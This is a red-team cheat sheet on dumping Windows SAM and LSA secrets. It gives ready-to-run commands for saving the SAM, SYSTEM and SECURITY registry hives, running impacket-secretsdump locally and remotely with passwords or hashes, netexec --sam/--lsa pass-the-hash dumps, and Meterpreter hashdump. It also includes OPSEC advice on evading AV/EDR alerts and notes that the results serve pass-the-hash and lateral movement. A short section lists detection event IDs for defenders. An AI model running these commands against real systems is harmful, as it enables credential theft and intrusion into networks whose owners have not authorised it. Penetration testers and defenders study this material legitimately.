# SAM & LSA Dumping

## 🔹 Overview

Dumping credentials from Windows systems is a core post-exploitation technique used to obtain:

* Local account password hashes
* Cached credentials
* Secrets used for authentication

The two main targets are:

* **SAM (Security Account Manager)**
* **LSA (Local Security Authority)**

---

## 🔹 What is SAM?

The **Security Account Manager (SAM)** is a Windows database that stores:

* Local user accounts
* Password hashes (NTLM)

 Location (registry hive):

```
HKLM\SAM
```

### Key Points:

* Stores **NTLM hashes**, not plaintext passwords
* Requires **SYSTEM privileges** to access
* Used for:

  * Pass-the-Hash attacks
  * Offline cracking

---

## 🔹 What is LSA?

The **Local Security Authority (LSA)** is responsible for:

* Enforcing security policies
* Handling authentication
* Storing sensitive secrets

 Location (registry hive):

```
HKLM\SECURITY
```

###  LSA Secrets May Include:

* Cached domain credentials
* Service account passwords
* Auto-logon credentials
* Kerberos keys

---

## 🔹 Required Hive for Decryption

To successfully extract and decrypt SAM/LSA data, you also need:

```
HKLM\SYSTEM
```

👉 This hive contains the **boot key**, used to decrypt protected data.

---

# 🔹 Dumping SAM & LSA

---

## 🖥️ Dumping SAM Locally with impacket-secretsdump

### 1 Exfiltrate Registry Hives

```bash id="b2c6k1"
C:\WINDOWS\system32> reg save hklm\sam       C:\Windows\temp\sam.save
C:\WINDOWS\system32> reg save hklm\system    C:\Windows\temp\system.save
C:\WINDOWS\system32> reg save hklm\security  C:\Windows\temp\security.save
```

---

### 2 Dump SAM and LSA

```bash id="h3d9lm"
$ impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

---

##  Dumping SAM Remotely with impacket-secretsdump

```bash id="r8k2pz"
$ impacket-secretsdump 'domain'/'administrator':'password'@'ip' -outputfile hash_dumps.txt

$ impacket-secretsdump -dc-ip ip 'administrator'@ip -hashes Hash:Hash -outputfile hash_dumps.txt
```

---

##  Dumping SAM Remotely with netexec

```bash id="m4v7qs"
$ netexec smb ip -u 'administrator' -H Hash --sam
$ netexec smb ip -u 'administrator' -H Hash --lsa
```

---

##  Dumping SAM with Meterpreter

```bash id="z9x1tw"
meterpreter > run post/windows/gather/hashdump
```

---

# 🔹 Attack Value

Dumped data can be used for:

*  **Pass-the-Hash**
*  **Offline password cracking**
*  **Privilege escalation**
*  **Lateral movement**

---

# 🔹 Detection & Defense (Blue Team Insight)

Even though this is a red team technique, defenders can detect it via:

###  Windows Logs:

* Event ID **4656 / 4663** → Access to registry hives
* Event ID **4672** → Privileged logon

###  Sysmon:

* Event ID **1** → Suspicious process execution (`reg.exe`, dumping tools)
* Event ID **10** → Access to sensitive processes

---

# 🔹 OPSEC Notes

* Dumping SAM/LSA is **highly sensitive and noisy**
* Tools like `secretsdump` may trigger:

  * AV/EDR alerts
  * Suspicious SMB activity
* Prefer:

  * Living-off-the-land techniques (e.g., `reg save`)
  * Offline exfiltration & analysis

---

# 🔹 Summary

* **SAM** → Local account hashes
* **LSA** → Cached credentials & secrets
* **SYSTEM hive** → Required for decryption

Dumping these provides **full credential access**, making it one of the most powerful post-exploitation techniques in Windows environments.

---
